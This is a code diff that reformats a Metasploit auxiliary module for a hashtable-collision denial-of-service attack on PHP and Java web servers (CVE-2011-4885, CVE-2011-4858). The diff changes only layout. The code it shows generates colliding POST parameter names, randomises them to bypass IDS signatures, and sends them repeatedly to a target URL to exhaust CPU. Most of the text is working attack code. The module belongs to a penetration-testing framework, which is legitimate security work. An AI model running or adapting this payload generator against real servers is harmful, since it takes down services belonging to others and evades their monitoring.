@@ -8,21 +8,22 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Dos
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'          => 'Hashtable Collisions',
-      'Description'   => %q{
-        This module uses a denial-of-service (DoS) condition appearing in a variety of
-        programming languages. This vulnerability occurs when storing multiple values
-        in a hash table and all values have the same hash value. This can cause a web server
-        parsing the POST parameters issued with a request into a hash table to consume
-        hours of CPU with a single HTTP request.
+    super(
+      update_info(
+        info,
+        'Name' => 'Hashtable Collisions',
+        'Description' => %q{
+          This module uses a denial-of-service (DoS) condition appearing in a variety of
+          programming languages. This vulnerability occurs when storing multiple values
+          in a hash table and all values have the same hash value. This can cause a web server
+          parsing the POST parameters issued with a request into a hash table to consume
+          hours of CPU with a single HTTP request.
 
-        Currently, only the hash functions for PHP and Java are implemented.
-        This module was tested with PHP + httpd, Tomcat, Glassfish and Geronimo.
-        It also generates a random payload to bypass some IDS signatures.
-      },
-      'Author'        =>
-        [
+          Currently, only the hash functions for PHP and Java are implemented.
+          This module was tested with PHP + httpd, Tomcat, Glassfish and Geronimo.
+          It also generates a random payload to bypass some IDS signatures.
+        },
+        'Author' => [
           'Alexander Klink', # advisory
           'Julian Waelde', # advisory
           'Scott A. Crosby', # original advisory
@@ -30,9 +31,8 @@ class MetasploitModule < Msf::Auxiliary
           'Krzysztof Kotowicz', # payload generator
           'Christian Mehlmauer' # metasploit module
         ],
-      'License'       => MSF_LICENSE,
-      'References'    =>
-        [
+        'License' => MSF_LICENSE,
+        'References' => [
           ['URL', 'http://www.ocert.org/advisories/ocert-2011-003.html'],
           ['URL', 'http://www.nruns.com/_downloads/advisory28122011.pdf'],
           ['URL', 'http://events.ccc.de/congress/2011/Fahrplan/events/4680.en.html'],
@@ -43,24 +43,27 @@ class MetasploitModule < Msf::Auxiliary
           ['CVE', '2011-4885'],
           ['CVE', '2011-4858']
         ],
-      'DisclosureDate'=> '2011-12-28'
-    ))
+        'DisclosureDate' => '2011-12-28'
+      )
+    )
 
     register_options(
-    [
-      OptEnum.new('TARGET', [ true, 'Target to attack', nil, ['PHP','Java']]),
-      OptString.new('URL', [ true, "The request URI", '/' ]),
-      OptInt.new('RLIMIT', [ true, "Number of requests to send", 50 ])
-    ])
+      [
+        OptEnum.new('TARGET', [ true, 'Target to attack', nil, ['PHP', 'Java']]),
+        OptString.new('URL', [ true, "The request URI", '/' ]),
+        OptInt.new('RLIMIT', [ true, "Number of requests to send", 50 ])
+      ]
+    )
 
     register_advanced_options(
-    [
-      OptInt.new('RecursiveMax', [false, "Maximum recursions when searching for collisionchars", 15]),
-      OptInt.new('MaxPayloadSize', [false, "Maximum size of the Payload in Megabyte. Autoadjust if 0", 0]),
-      OptInt.new('CollisionChars', [false, "Number of colliding chars to find", 5]),
-      OptInt.new('CollisionCharLength', [false, "Length of the collision chars (2 = Ey, FZ; 3=HyA, ...)", 2]),
-      OptInt.new('PayloadLength', [false, "Length of each parameter in the payload", 8])
-    ])
+      [
+        OptInt.new('RecursiveMax', [false, "Maximum recursions when searching for collisionchars", 15]),
+        OptInt.new('MaxPayloadSize', [false, "Maximum size of the Payload in Megabyte. Autoadjust if 0", 0]),
+        OptInt.new('CollisionChars', [false, "Number of colliding chars to find", 5]),
+        OptInt.new('CollisionCharLength', [false, "Length of the collision chars (2 = Ey, FZ; 3=HyA, ...)", 2]),
+        OptInt.new('PayloadLength', [false, "Length of each parameter in the payload", 8])
+      ]
+    )
   end
 
   def generate_payload
@@ -74,7 +77,7 @@ class MetasploitModule < Msf::Auxiliary
     length = datastore['PayloadLength']
     size = collision_chars.length
     post = ""
-    max_value_float = size ** length
+    max_value_float = size**length
     max_value_int = max_value_float.floor
     print_status("#{rhost}:#{rport} - Generating POST data...")
     for i in 0.upto(max_value_int)
@@ -99,7 +102,7 @@ class MetasploitModule < Msf::Auxiliary
     end
     # Generate all possible strings
     source = a
-    for i in Range.new(1,length-1)
+    for i in Range.new(1, length - 1)
       source = source.product(a)
     end
     source = source.map(&:join)
@@ -112,6 +115,7 @@ class MetasploitModule < Msf::Auxiliary
       if item == base_str
         next
       end
+
       if @function.call(item) == base_hash
         # Hooray we found a matching hash
         hashes[counter.to_s] = item
@@ -147,7 +151,7 @@ class MetasploitModule < Msf::Auxiliary
     counter = input_string.length - 1
     result = start
     input_string.each_char do |item|
-      result = result + ((base ** counter) * item.ord)
+      result = result + ((base**counter) * item.ord)
       counter = counter - 1
     end
     return result.round
@@ -165,39 +169,40 @@ class MetasploitModule < Msf::Auxiliary
 
   def run
     case datastore['TARGET']
-      when /PHP/
-        @function = method(:djbx33a)
-        @char_range = Range.new(0, 255)
-        if (datastore['MaxPayloadSize'] <= 0)
-          datastore['MaxPayloadSize'] = 8   # XXX: Refactor
-        end
-      when /Java/
-        @function = method(:djbx31a)
-        @char_range = Range.new(0, 128)
-        if (datastore['MaxPayloadSize'] <= 0)
-          datastore['MaxPayloadSize'] = 2   # XXX: Refactor
-        end
-      else
-        raise RuntimeError, "Target #{datastore['TARGET']} not supported"
+    when /PHP/
+      @function = method(:djbx33a)
+      @char_range = Range.new(0, 255)
+      if (datastore['MaxPayloadSize'] <= 0)
+        datastore['MaxPayloadSize'] = 8   # XXX: Refactor
+      end
+    when /Java/
+      @function = method(:djbx31a)
+      @char_range = Range.new(0, 128)
+      if (datastore['MaxPayloadSize'] <= 0)
+        datastore['MaxPayloadSize'] = 2   # XXX: Refactor
+      end
+    else
+      raise RuntimeError, "Target #{datastore['TARGET']} not supported"
     end
 
     print_status("#{rhost}:#{rport} - Generating payload...")
     payload = generate_payload
     return if payload == nil
+
     # trim to maximum payload size (in MB)
-    max_in_mb = datastore['MaxPayloadSize']*1024*1024
-    payload = payload[0,max_in_mb]
+    max_in_mb = datastore['MaxPayloadSize'] * 1024 * 1024
+    payload = payload[0, max_in_mb]
     # remove last invalid(cut off) parameter
     position = payload.rindex("=&")
-    payload = payload[0,position+1]
+    payload = payload[0, position + 1]
     print_status("#{rhost}:#{rport} -Payload generated")
 
     for x in 1..datastore['RLIMIT']
       print_status("#{rhost}:#{rport} - Sending request ##{x}...")
       opts = {
         'method'	=> 'POST',
-        'uri'		=> normalize_uri(datastore['URL']),
-        'data'		=> payload
+        'uri'	=> normalize_uri(datastore['URL']),
+        'data'	=> payload
       }
       begin
         c = connect
